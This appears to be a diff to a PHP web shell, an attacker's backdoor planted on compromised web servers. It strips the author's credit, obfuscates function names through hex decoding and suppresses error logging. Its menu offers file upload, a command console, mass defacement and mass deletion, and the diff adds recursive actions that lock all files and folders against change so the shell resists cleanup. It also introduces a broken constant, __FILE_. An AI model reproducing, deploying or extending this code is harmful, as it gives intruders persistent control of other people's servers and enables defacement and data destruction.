@@ -1,9 +1,4 @@
 <?php
-/*
-// Author : Mr.7Mind
-// Team   : RibelCyberTeam
-// Email  : ribelcyberteam@gmail.com
-*/
 $Array = [
 
 // $GLOBALS['fungsi'][0]
@@ -21,6 +16,8 @@ for ($i = 0; $i < $hitung_array; $i++) {
     $fungsi[] = unhex($Array[$i]);
 }
 error_reporting(0);
+@clearstatcache();
+@mb_internal_encoding('UTF-8');
 set_time_limit(0);
 @ini_set('error_log',null);
 @ini_set('log_errors',0);
@@ -365,125 +362,149 @@ echo "
 			</div>
 		</div>
 		<div class='text-center'>
-			<div class='btn-group'>
-				<a class='btn btn-outline-light btn-sm' href='?dir=".hex($fungsi[7]())."&id=upload'><i class='bi bi-upload'></i> Upload</a>
-				<a class='btn btn-outline-light btn-sm' href='?dir=".hex($fungsi[7]())."&id=deface'><i class='bi bi-exclamation-diamond'></i> Mass deface</a>
-				<a class='btn btn-outline-light btn-sm' href='?dir=".hex($fungsi[7]())."&id=delete'><i class='bi bi-trash'></i> Mass delete</a>
-				<a class='btn btn-outline-light btn-sm' href='?dir=".hex($fungsi[7]())."&id=cmd'><i class='bi bi-terminal'></i> Console</a>
-				<a class='btn btn-outline-light btn-sm' href='?dir=".hex($fungsi[7]())."&id=lockfolder'><i class='bi bi-folder'></i> Lock Folder</a>
-				<a class='btn btn-outline-light btn-sm' href='?dir=".hex($fungsi[7]())."&id=rootfolder'><i class='bi bi-folder'></i> unLock Folder</a>
-				<a class='btn btn-outline-light btn-sm' href='?dir=".hex($fungsi[7]())."&id=root_file'><i class='bi bi-file-earmark'></i> Green All File</a>
-				<a class='btn btn-outline-light btn-sm' href='?dir=".hex($fungsi[7]())."&id=root_folders'><i class='bi bi-file-earmark'></i> Green All Folders</a>
-				<a class='btn btn-outline-light btn-sm' href='?dir=".hex($fungsi[7]())."&id=scan_root'><i class='bi bi-search'></i> Scan root</a>
-				<a class='btn btn-outline-light btn-sm' href='?dir=".hex($fungsi[7]())."&id=network'><i class='bi bi-hdd-network'></i> Network</a>
-				<a class='btn btn-outline-light btn-sm' href='?dir=".hex($fungsi[7]())."&id=lockshell'><i class='bi bi-file-earmark-lock'></i> Lock Shell</a>
-				<a class='btn btn-outline-light btn-sm' href='?dir=".hex($fungsi[7]())."&id=rootshell'><i class='bi bi-file-earmark-lock'></i> 0777 Shell</a>
-				<a class='btn btn-outline-light btn-sm' href='?logout=true'><i class='bi bi-box-arrow-in-left'></i> Logout</a>
-			</div>
-		</div>";
-		if(isset($_7['dir'])) {
-			$dir = unhex($_7['dir']);
-			chdir($dir);
-		} else {
-			$dir = hex($gcw());
-		}
-		$dir = str_replace("\\","/",$dir);
-		$scdir = explode("/", $dir);	
-		for($i = 0; $i <= $c_dir; $i++) {
-			$scdir[$i];
-			if($i != $c_dir) {
-		}
-		
-		function changeFilePermissions($filename, $permissions) {
-		if (file_exists($filename)) {
+    <div class='btn-group'>
+        <a class='btn btn-outline-light btn-sm' href='?dir=".hex($fungsi[7]())."&id=upload'><i class='bi bi-upload'></i> Upload</a>
+        <a class='btn btn-outline-light btn-sm' href='?dir=".hex($fungsi[7]())."&id=cmd'><i class='bi bi-terminal'></i> Console</a>
+    </div>
+    <div class='btn-group'>
+        <a class='btn btn-outline-light btn-sm' href='?dir=".hex($fungsi[7]())."&id=deface'><i class='bi bi-exclamation-diamond'></i> Mass deface</a>
+        <a class='btn btn-outline-light btn-sm' href='?dir=".hex($fungsi[7]())."&id=delete'><i class='bi bi-trash'></i> Mass delete</a>
+    </div>
+    <div class='btn-group'>
+        <a class='btn btn-outline-light btn-sm' href='?dir=".hex($fungsi[7]())."&id=lockfolder'><i class='bi bi-folder'></i> Lock Folder</a>
+        <a class='btn btn-outline-light btn-sm' href='?dir=".hex($fungsi[7]())."&id=rootfolder'><i class='bi bi-folder'></i> unLock Folder</a>
+    </div>
+    <div class='btn-group'>
+        <a class='btn btn-outline-light btn-sm' href='?dir=".hex($fungsi[7]())."&id=scan_root'><i class='bi bi-search'></i> Scan root</a>
+        <a class='btn btn-outline-light btn-sm' href='?dir=".hex($fungsi[7]())."&id=network'><i class='bi bi-hdd-network'></i> Network</a>
+    </div>
+    <div class='btn-group'>
+        <a class='btn btn-outline-light btn-sm' href='?dir=".hex($fungsi[7]())."&id=lockshell'><i class='bi bi-file-earmark-lock'></i> Lock Shell</a>
+        <a class='btn btn-outline-light btn-sm' href='?dir=".hex($fungsi[7]())."&id=rootshell'><i class='bi bi-file-earmark-lock'></i> 0777 Shell</a>
+    </div>
+    <div class='btn-group'>
+        <a class='btn btn-outline-light btn-sm' href='?logout=true'><i class='bi bi-box-arrow-in-left'></i> Logout</a>
+    </div><br><br>
+    <div class='btn-group'>
+        <a class='btn btn-outline-light btn-sm' href='?dir=".hex($fungsi[7]())."&id=root_file'><i class='bi bi-file-earmark'></i> Green All File</a>
+		<a class='btn btn-outline-light btn-sm' href='?dir=".hex($fungsi[7]())."&id=root_folders'><i class='bi bi-file-earmark'></i> Green All Folders</a>
+    </div>
+    <div class='btn-group'>
+        <a class='btn btn-outline-light btn-sm' href='?dir=".hex($fungsi[7]())."&id=dark_file'><i class='bi bi-file-earmark'></i> Lock All File</a>
+        <a class='btn btn-outline-light btn-sm' href='?dir=".hex($fungsi[7]())."&id=dark_folders'><i class='bi bi-file-earmark'></i> Lock All Folders</a>
+    </div>
+</div>
+";
+if(isset($_7['dir'])) {
+	$dir = unhex($_7['dir']);
+	chdir($dir);
+	} else {
+$dir = hex($gcw());
+}
+$dir = str_replace("\\","/",$dir);
+	$scdir = explode("/", $dir);	
+for($i = 0; $i <= $c_dir; $i++) {
+	$scdir[$i];
+if($i != $c_dir) {
+}
+function changeFilePermissions($filename, $permissions) {
+    if (file_exists($filename)) {
         if (chmod($filename, $permissions)) {
             echo "Izin file $filename berhasil diubah menjadi $permissions.";
         } else {
             echo "Gagal mengubah izin file $filename.";
         }
-		} else {
+    } else {
         echo "File $filename tidak ditemukan.";
-		}
-		}
-		if (isset($_GET['id']) && $_GET['id'] === 'lockshell') {
-		$filename = __FILE__;
-		$newPermissions = 0444;
-		changeFilePermissions($filename, $newPermissions);
-		}
-		if (isset($_GET['id']) && $_GET['id'] === 'rootshell') {
-		$filename = __FILE__;
-		$newPermissions = 0777;
-		changeFilePermissions($filename, $newPermissions);
-		}
-		
-		function lockFolder($folderPath, $permissions) {
-		if (is_dir($folderPath)) {
+    }
+}
+
+function lockFolder($folderPath, $permissions) {
+    if (is_dir($folderPath)) {
         if (chmod($folderPath, $permissions)) {
             echo "Folder locked successfully!";
         } else {
             echo "Error locking folder.";
         }
-		} else {
-			echo "Folder not found.";
-		}
-		}
-		if (isset($_GET['id']) && $_GET['id'] === 'lockfolder') {
-		$folderPath = __DIR__;
-		$newPermissions = 0555;
-		$actionMessage = lockFolder($folderPath, $newPermissions);
-		}
-		function rootFolder($folderPath, $permissions) {
-		if (is_dir($folderPath)) {
+    } else {
+        echo "Folder not found.";
+    }
+}
+
+function rootFolder($folderPath, $permissions) {
+    if (is_dir($folderPath)) {
         if (chmod($folderPath, $permissions)) {
             return "Folder permissions changed successfully!";
         } else {
             return "Error changing folder permissions.";
         }
-		} else {
+    } else {
         return "Folder not found.";
-		}
-		}
-		if (isset($_GET['id']) && $_GET['id'] === 'rootfolder') {
-		$folderPath = __DIR__;
-		$newPermissions = 0777;
-		$actionMessage = rootFolder($folderPath, $newPermissions);
-		echo $actionMessage;
-		}
-		function changePermissionsRecursive($dir, $perms) {
-		$iterator = new RecursiveIteratorIterator(
+    }
+}
+
+function changeFolderPermissionsRecursive($dir, $perms) {
+    $iterator = new RecursiveIteratorIterator(
         new RecursiveDirectoryIterator($dir, RecursiveDirectoryIterator::SKIP_DOTS),
         RecursiveIteratorIterator::SELF_FIRST
-		);
-		foreach ($iterator as $item) {
-        if ($item->isFile()) {
-            chmod($item->getPathname(), $perms);
-        }
-		}
-		}
-		$currentDirectory = '.';
-		$newPermissions = 0644;
-		if (isset($_GET['id']) && $_GET['id'] === 'root_file') {
-		changePermissionsRecursive($currentDirectory, $newPermissions);
-		echo "Permissions changed for all files in the current directory.";
-		}
-		
-		function changeFolderPermissionsRecursive($dir, $perms) {
-		$iterator = new RecursiveIteratorIterator(
-        new RecursiveDirectoryIterator($dir, RecursiveDirectoryIterator::SKIP_DOTS),
-        RecursiveIteratorIterator::SELF_FIRST
-		);
-		foreach ($iterator as $item) {
+    );
+
+    foreach ($iterator as $item) {
         if ($item->isDir()) {
             chmod($item->getPathname(), $perms);
         }
-		}
-		}
-		$currentDirectory = '.';
-		$newPermissions = 0755;
-		if (isset($_GET['id']) && $_GET['id'] === 'root_folders') {
-		changeFolderPermissionsRecursive($currentDirectory, $newPermissions);
-		echo "Permissions changed for all folders in the current directory.";
-		}
+    }
+}
+
+function changeFilePermissionsRecursive($dir, $perms) {
+    $iterator = new RecursiveIteratorIterator(
+        new RecursiveDirectoryIterator($dir, RecursiveDirectoryIterator::SKIP_DOTS),
+        RecursiveIteratorIterator::SELF_FIRST
+    );
+
+    foreach ($iterator as $item) {
+        if ($item->isFile()) {
+            chmod($item->getPathname(), $perms);
+        }
+    }
+}
+
+$currentDirectory = '.';
+
+if (isset($_GET['id']) && $_GET['id'] === 'root_file') {
+	$newFilePermissions = 0644;
+    changeFilePermissionsRecursive($currentDirectory, $newFilePermissions);
+    echo "Permissions changed for all files in the current directory.";
+}
+
+if (isset($_GET['id']) && $_GET['id'] === 'root_folders') {
+	$newFolderPermissions = 0755;
+    changeFolderPermissionsRecursive($currentDirectory, $newFolderPermissions);
+    echo "Permissions changed for all folders in the current directory.";
+}
+
+if (isset($_GET['id']) && $_GET['id'] === 'dark_file') {
+    $newFilePermissions = 0444;
+    changeFilePermissionsRecursive($currentDirectory, $newFilePermissions);
+    echo "Permissions changed for all files in the current directory.";
+}
+
+if (isset($_GET['id']) && $_GET['id'] === 'dark_folders') {
+    $newFolderPermissions = 0555;
+    changeFolderPermissionsRecursive($currentDirectory, $newFolderPermissions);
+    echo "Permissions changed for all folders in the current directory.";
+}
+
+$filename = __FILE_;
+
+if (isset($_GET['id']) && $_GET['id'] === 'lockshell') {
+    $newPermissions = 0444;
+    changeFilePermissions($filename, $newPermissions);
+}
+if (isset($_GET['id']) && $_GET['id'] === 'rootshell') {
+    $newPermissions = 0777;
+    changeFilePermissions($filename, $newPermissions);
+}
 		$ip = $_SERVER['REMOTE_ADDR'];
 		$rib = "http://ip-api.com/json/{$ip}?fields=city";
 		$ch = curl_init();
@@ -929,7 +950,6 @@ echo "
 			</form>
 		</div>";
 		}
-		//delete folder
 		if ($_7['action'] == 'delete_folder' ) {
 		s();
 		if ($_7['yeah']) {
